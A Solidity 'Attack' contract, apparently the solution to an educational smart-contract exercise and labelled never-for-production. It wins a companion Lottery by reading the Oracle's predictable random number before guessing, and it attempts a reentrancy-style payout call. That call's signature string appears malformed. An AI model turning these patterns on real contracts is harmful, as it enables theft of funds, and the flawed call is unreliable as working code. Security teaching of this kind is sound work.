// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.6.0;
pragma experimental ABIEncoderV2;

/// @title Lottery Game with interface to Oracle
/// @author Sparx - https://github.com/letsgitcracking
/// @notice WARNING - NEVER USE IN PRODUCTION - FOR EDUCATIONAL PURPOSES ONLY!

import "./Lottery.sol";
import "./Oracle.sol";

contract Attack {

    Lottery public eg;
    Oracle public ek;
    address private winner = 0x096f6A2b185d63D942750A2D961f7762401cbA17;

    constructor(address _oracle, address _lottery) public {
        eg = Lottery(payable(_lottery));
        ek = Oracle(_oracle);
    }

    function registerLottery(address _address) public payable {
        require(msg.value == 1_000_000_000);
        eg.registerTeam.value(msg.value)(_address, "Attack Contract", "");
    }

    function standardPayout() public {
        require(eg.makeAGuess(winner, ek.getRandomNumber()));
        require(eg.payoutWinningTeam(winner));
    }

    function reentrancyAttack() public {
        (, bytes memory temp) = address(eg).call(abi.encodeWithSignature
        ("payoutWinningTeam", winner));
        eg.payoutWinningTeam(bytesToAddress(temp));
    }

    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
        addr := mload(add(bys,20))
        } 
    }

    //transfer() external payable {} 
}